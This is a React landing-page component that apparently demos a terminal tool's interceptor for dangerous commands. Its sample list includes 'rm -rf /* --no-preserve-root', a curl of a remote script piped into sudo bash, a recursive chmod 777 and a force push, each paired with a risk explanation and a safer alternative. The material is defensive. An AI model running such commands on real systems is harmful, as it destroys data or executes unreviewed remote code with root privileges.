import React, { useState } from "react";
import { ShieldAlert, AlertTriangle } from "lucide-react";

export const PreflightGuard: React.FC = () => {
  const [activeDangerousIndex, setActiveDangerousIndex] = useState(0);

  const testCases = [
    {
      command: "rm -rf /* --no-preserve-root",
      riskLevel: "CRITICAL CATASTROPHIC",
      summary: "Destructive recursive file deletion across all root partitions.",
      riskReason: "Attempts to erase system binaries, kernel modules, and mounted drives irreversibly.",
      safeAlternative: "rm -rf ./tmp/build/* (Constrain deletion to isolated directory)",
    },
    {
      command: "curl -sSL https://suspicious-sh.xyz/setup.sh | sudo bash",
      riskLevel: "HIGH SECURITY RISK",
      summary: "Unverified remote script execution with root superuser privileges.",
      riskReason: "Piping remote HTTP responses directly into sudo bash bypasses code review and allows arbitrary remote code execution (RCE).",
      safeAlternative: "curl -sSL -O ./setup.sh && less ./setup.sh (Download and inspect before executing)",
    },
    {
      command: "chmod -R 777 /var/www/html",
      riskLevel: "SEVERE PERMISSION LEAK",
      summary: "Global read, write, and execute permissions granted to all system users.",
      riskReason: "Permits any unprivileged process or web visitor to overwrite web server scripts and execute arbitrary payloads.",
      safeAlternative: "find /var/www/html -type d -exec chmod 755 {} + && find /var/www/html -type f -exec chmod 644 {} +",
    },
    {
      command: "git push --force origin main",
      riskLevel: "BRANCH CORRUPTION",
      summary: "Destructive force-overwrite of the primary shared production branch.",
      riskReason: "Overwrites remote git history, destroying commits authored by teammates.",
      safeAlternative: "git push --force-with-lease origin main (Ensures no unseen commits are overwritten)",
    },
  ];

  return (
    <section id="preflight" className="section" style={{ background: "rgba(10, 4, 4, 0.4)" }}>
      <div className="container">
        
        {/* Section Header */}
        <div className="section-header">
          <div
            className="badge-pill"
            style={{
              marginBottom: "1rem",
              background: "rgba(239, 68, 68, 0.1)",
              borderColor: "rgba(239, 68, 68, 0.3)",
              color: "#fca5a5",
            }}
          >
            <ShieldAlert size={14} />
            <span>DON NORMAN ERROR PREVENTION: PREFLIGHT CHECK</span>
          </div>
          <h2>
            Never Accidentally <span style={{ color: "#f87171" }}>Nuke Your Machine</span> Again
          </h2>
          <p>
            Copy-pasting scripts from the web or running hallucinations is dangerous. Termalime features an automated heuristic and AI-powered Preflight Interceptor that catches fatal commands before a single byte reaches the PTY.
          </p>
        </div>

        {/* Interactive Preflight Simulator */}
        <div className="grid-2" style={{ alignItems: "stretch", gap: "2.5rem" }}>
          
          {/* Left: Interactive Testbed */}
          <div className="m3-card" style={{ borderColor: "rgba(239, 68, 68, 0.25)", background: "#060303" }}>
            <h3 style={{ fontSize: "1.25rem", color: "#fff", marginBottom: "0.5rem" }}>
              Test Risky Command Interceptions
            </h3>
            <p style={{ fontSize: "0.92rem", color: "var(--text-secondary)", marginBottom: "1.5rem" }}>
              Select a dangerous command to see how Termalime's tokenization engine detects risk:
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: "10px", marginBottom: "1.5rem" }}>
              {testCases.map((tc, idx) => (
                <button
                  key={idx}
                  onClick={() => setActiveDangerousIndex(idx)}
                  style={{
                    padding: "0.85rem 1rem",
                    borderRadius: "10px",
                    background: activeDangerousIndex === idx ? "rgba(239, 68, 68, 0.15)" : "rgba(0, 0, 0, 0.4)",
                    border: activeDangerousIndex === idx ? "1px solid rgba(239, 68, 68, 0.4)" : "1px solid rgba(255, 255, 255, 0.08)",
                    textAlign: "left",
                    cursor: "pointer",
                    transition: "all 0.15s ease",
                  }}
                >
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "4px" }}>
                    <code style={{ fontSize: "0.82rem", color: activeDangerousIndex === idx ? "#fca5a5" : "#e2e8f0" }}>
                      {tc.command}
                    </code>
                    <span
                      style={{
                        fontSize: "0.68rem",
                        fontWeight: 700,
                        color: "#f87171",
                        background: "rgba(239, 68, 68, 0.1)",
                        padding: "2px 6px",
                        borderRadius: "4px",
                      }}
                    >
                      {tc.riskLevel}
                    </span>
                  </div>
                </button>
              ))}
            </div>

            <div style={{ borderTop: "1px solid rgba(255, 255, 255, 0.08)", paddingTop: "1rem" }}>
              <p style={{ fontSize: "0.82rem", color: "var(--text-muted)", margin: 0 }}>
                💡 Hardened in v0.4: Commands are tokenized with shell-grammar awareness to prevent evasion via aliases or variable expansion.
              </p>
            </div>
          </div>

          {/* Right: The Interceptor Card */}
          <div
            className="m3-card"
            style={{
              background: "#0a0303",
              borderColor: "rgba(239, 68, 68, 0.35)",
              boxShadow: "0 20px 60px rgba(0, 0, 0, 0.8), 0 0 30px rgba(239, 68, 68, 0.1)",
              display: "flex",
              flexDirection: "column",
              justifyContent: "space-between",
            }}
          >
            <div>
              <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "1.2rem" }}>
                <div
                  style={{
                    background: "rgba(239, 68, 68, 0.2)",
                    border: "1px solid rgba(239, 68, 68, 0.4)",
                    color: "#f87171",
                    padding: "8px",
                    borderRadius: "8px",
                  }}
                >
                  <AlertTriangle size={22} />
                </div>
                <div>
                  <p style={{ fontSize: "0.72rem", textTransform: "uppercase", letterSpacing: "0.08em", color: "#f87171", margin: 0, fontWeight: 700 }}>
                    HEURISTIC SHIELD ACTIVE
                  </p>
                  <h4 style={{ margin: "2px 0 0", fontSize: "1.15rem", color: "#fff" }}>
                    ⚠️ Command Blocked Pending Approval
                  </h4>
                </div>
              </div>

              <div style={{ background: "#040101", border: "1px solid rgba(239, 68, 68, 0.25)", borderRadius: "8px", padding: "0.85rem", marginBottom: "1rem" }}>
                <span style={{ fontSize: "0.7rem", color: "var(--text-muted)", textTransform: "uppercase", display: "block", marginBottom: "4px" }}>
                  Flagged Command
                </span>
                <code style={{ fontSize: "0.88rem", color: "#fca5a5", fontFamily: "var(--font-mono)" }}>
                  {testCases[activeDangerousIndex].command}
                </code>
              </div>

              <div style={{ marginBottom: "1rem" }}>
                <h5 style={{ fontSize: "0.8rem", color: "#f87171", textTransform: "uppercase", margin: "0 0 4px" }}>
                  Risk Assessment
                </h5>
                <p style={{ fontSize: "0.9rem", color: "var(--text-secondary)", margin: 0, lineHeight: "1.5" }}>
                  {testCases[activeDangerousIndex].riskReason}
                </p>
              </div>

              <div
                style={{
                  background: "rgba(52, 211, 153, 0.08)",
                  border: "1px solid rgba(52, 211, 153, 0.2)",
                  borderRadius: "8px",
                  padding: "0.85rem",
                  marginBottom: "1.5rem",
                }}
              >
                <h5 style={{ fontSize: "0.8rem", color: "var(--lime-bright)", textTransform: "uppercase", margin: "0 0 4px" }}>
                  Safe Alternative Recommended
                </h5>
                <code style={{ fontSize: "0.82rem", color: "#bbf7d0", fontFamily: "var(--font-mono)", wordBreak: "break-all" }}>
                  {testCases[activeDangerousIndex].safeAlternative}
                </code>
              </div>
            </div>

            <div style={{ display: "flex", gap: "10px", justifyContent: "flex-end" }}>
              <button
                style={{
                  padding: "0.65rem 1.2rem",
                  background: "rgba(255, 255, 255, 0.08)",
                  border: "1px solid rgba(255, 255, 255, 0.15)",
                  borderRadius: "8px",
                  color: "#fff",
                  fontSize: "0.85rem",
                  fontWeight: 600,
                  cursor: "pointer",
                }}
              >
                Abort Command (Safe)
              </button>
              <button
                style={{
                  padding: "0.65rem 1.2rem",
                  background: "linear-gradient(180deg, #ef4444, #dc2626)",
                  border: "none",
                  borderRadius: "8px",
                  color: "#fff",
                  fontSize: "0.85rem",
                  fontWeight: 700,
                  cursor: "pointer",
                }}
              >
                Run Anyway
              </button>
            </div>
          </div>

        </div>

      </div>
    </section>
  );
};
